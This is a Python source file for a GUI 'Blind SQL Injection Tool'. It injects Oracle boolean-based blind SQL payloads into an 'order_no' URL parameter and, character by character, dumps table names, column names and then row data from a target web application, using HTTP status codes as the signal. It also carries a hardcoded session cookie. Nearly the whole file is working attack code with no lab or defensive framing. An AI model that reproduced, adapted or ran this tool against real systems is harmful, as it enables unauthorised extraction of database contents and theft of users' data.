import tkinter as tk
from tkinter import messagebox
import requests
import time
import threading

url = "yourURL"
results = []
result = ""
headers = {
    "Host": "yourhost",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "yourreferer",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "G_ENABLED_IDPS=google; JSESSIONID=F67CECDBB0164EE40D2C62DF21CDF66B",
    "Connection": "keep-alive"
}
dir2 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','_']
dir = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
       'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '$',
       '.', ' ', '_', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!','@']
class App:
    def __init__(self, root):
        self.root = root
        self.root.title("Blind SQL Injection Tool")
        self.root.geometry("800x400")
        self.selected_item = None
        # 버튼 프레임 (가로 배치)
        button_frame = tk.Frame(root)
        button_frame.pack(pady=10)

        # 버튼 추가
        self.button1 = tk.Button(button_frame, text="show tables", command=self.step1)
        self.button1.pack(side=tk.LEFT, padx=10)

        self.button2 = tk.Button(button_frame, text="show columns", command=self.step2)
        self.button2.pack(side=tk.LEFT, padx=10)

        self.button3 = tk.Button(button_frame, text="show data", command=self.step3)
        self.button3.pack(side=tk.LEFT, padx=10)

        # 리스트박스와 라벨 추가
        listbox_frame = tk.Frame(root)
        listbox_frame.pack(pady=10)

        self.label1 = tk.Label(listbox_frame, text="Tables")
        self.label1.grid(row=0, column=0, padx=10)
        self.listbox1 = tk.Listbox(listbox_frame, height=5)
        self.listbox1.grid(row=1, column=0, padx=10)

        self.label2 = tk.Label(listbox_frame, text="Columns")
        self.label2.grid(row=0, column=1, padx=10)
        self.listbox2 = tk.Listbox(listbox_frame, height=5)
        self.listbox2.grid(row=1, column=1, padx=10)

        self.label3 = tk.Label(listbox_frame, text="Data")
        self.label3.grid(row=0, column=2, padx=10)
        self.listbox3 = tk.Listbox(listbox_frame, height=5)
        self.listbox3.grid(row=1, column=2, padx=10)

        # 추가 리스트박스를 아래쪽에 세로로 배치
        listbox_bottom_frame = tk.Frame(root)
        listbox_bottom_frame.pack(pady=10)

        tk.Label(listbox_bottom_frame, text="Tables:").pack(anchor=tk.W)
        self.bottom_listbox1 = tk.Listbox(listbox_bottom_frame, height=1, width=90)
        self.bottom_listbox1.pack(pady=5)

        tk.Label(listbox_bottom_frame, text="Columns:").pack(anchor=tk.W)
        self.bottom_listbox2 = tk.Listbox(listbox_bottom_frame, height=1, width=90)
        self.bottom_listbox2.pack(pady=5)

        tk.Label(listbox_bottom_frame, text="Data:").pack(anchor=tk.W)
        self.bottom_listbox3 = tk.Listbox(listbox_bottom_frame, height=1, width=90)
        self.bottom_listbox3.pack(pady=5)

    def step1(self):
        self.listbox1.delete(0, tk.END)  # 기존 항목 삭제
        # BlindSQL 함수를 별도 스레드로 실행
        threading.Thread(target=self.run_blind_sql).start()

    def step2(self):
        self.listbox2.delete(0, tk.END)
        selected = self.listbox1.curselection()
        if selected:
            self.selected_item = self.listbox1.get(selected[0])
            item = self.listbox1.get(selected[0])
            threading.Thread(target=self.run_blind_sql2, args=(item,)).start()
        else:
            messagebox.showwarning("Warning", "Select an item from Step 1")

    def step3(self):
        self.listbox3.delete(0, tk.END)
        selected = self.listbox2.curselection()
        if selected:
            item1 = self.selected_item
            item2 = self.listbox2.get(selected[0])
            threading.Thread(target=self.run_blind_sql3, args=(item1, item2)).start()
        else:
            messagebox.showwarning("Warning", "Select an item from Step 2")
        
    def run_blind_sql(self):
        print("table start")
        for j in range(10, 100):
            icnt = 0
            cnt = 0
            result = ""
            for i in range(1, 20):
                cnt = 0
                for char in dir2:
                    payload = f"16 AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM USER_TABLES) WHERE rn = {j}), {i}, 1)='{char}'--"
                    payload2 = f"(SELECT table_name, ROWNUM AS rn FROM USER_TABLES) WHERE rn = {j}), {i}, 1)='{char}'--"
                    self.root.after(0, self.update_bottom_listbox, payload2)
                    params = {
                        f"order_no": payload
                    }
                    response = requests.get(url, headers=headers, params=params)
                    if response.status_code == 200:
                        result += char
                        break
                    elif response.status_code == 500:
                        cnt += 1
                if cnt >= 27:
                    break
            if i == 1 and cnt == 27:
                break
            print(f"table result: {result}")
            results.append(result)
            self.root.after(0, self.update_listbox, result)
        print("sql2 end")

    def update_listbox(self, result):
        self.listbox1.insert(tk.END, result)  

    def update_bottom_listbox(self, payload):
        self.bottom_listbox1.delete(0, tk.END)
        self.bottom_listbox1.insert(tk.END, payload) 
        self.bottom_listbox1.yview(tk.END)  

    def run_blind_sql2(self, item):
        print("column start")
        for j2 in range(1, 100):
            icnt = 0
            cnt = 0
            result = ""
            for i2 in range(1, 20):
                cnt = 0
                for char in dir2:
                    payload = f"16 AND SUBSTR((SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS rn FROM USER_TAB_COLUMNS WHERE TABLE_NAME = '{item}') WHERE rn = {j2}), {i2}, 1)='{char}'--"
                    payload2 = f"FROM USER_TAB_COLUMNS WHERE TABLE_NAME = '{item}') WHERE rn = {j2}), {i2}, 1)='{char}'--"
                    self.root.after(0, self.update_bottom_listbox2, payload2)
                    params = {
                        f"order_no": payload
                    }
                    response = requests.get(url, headers=headers, params=params)
                    if response.status_code == 200:
                        result += char
                        break
                    elif response.status_code == 500:
                        cnt += 1
                if cnt >= 27:
                    break
            if i2 == 1 and cnt == 27:
                break
            print(f"column result: {result}")
            results.append(result)
            # 메인 GUI 스레드에서 텍스트 박스를 업데이트
            self.root.after(0, self.update_listbox2, result)

    def update_listbox2(self, result):
        self.listbox2.insert(tk.END, result)  # 텍스트 박스에 결과 추가
    def update_bottom_listbox2(self, payload):
        self.bottom_listbox2.delete(0, tk.END)  # 기존 내용 삭제
        self.bottom_listbox2.insert(tk.END, payload)  # 새 내용 삽입
        self.bottom_listbox2.yview(tk.END)  # 스크롤 자동 이동

    def run_blind_sql3(self, item1, item2):
        print("data start: ", item1, ", ", item2)
        for j2 in range(1, 100):
            icnt = 0
            cnt = 0
            result = ""
            for i2 in range(1, 20):
                cnt = 0
                for char in dir:
                    payload = f"16 AND SUBSTR((SELECT {item2} FROM (SELECT {item2}, ROWNUM AS rn FROM {item1}) WHERE rn = {j2}), {i2}, 1)='{char}'--"
                    payload2 = f"SELECT {item2}, ROWNUM AS rn FROM {item1}) WHERE rn = {j2}), {i2}, 1)='{char}'--"
                    self.root.after(0, self.update_bottom_listbox3, payload2)
                    params = {
                        f"order_no": payload
                    }
                    response = requests.get(url, headers=headers, params=params)
                    if response.status_code == 200:
                        result += char
                        break
                    elif response.status_code == 500:
                        cnt += 1
                if cnt >= 68:
                    break
            if i2 == 1 and cnt == 68:
                break
            print(f"column result: {result}")
            results.append(result)
            # 메인 GUI 스레드에서 텍스트 박스를 업데이트
            self.root.after(0, self.update_listbox3, result)

    def update_listbox3(self, result):
        self.listbox3.insert(tk.END, result)  # 텍스트 박스에 결과 추가
    def update_bottom_listbox3(self, payload):
        self.bottom_listbox3.delete(0, tk.END)  # 기존 내용 삭제
        self.bottom_listbox3.insert(tk.END, payload)  # 새 내용 삽입
        self.bottom_listbox3.yview(tk.END)  # 스크롤 자동 이동

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
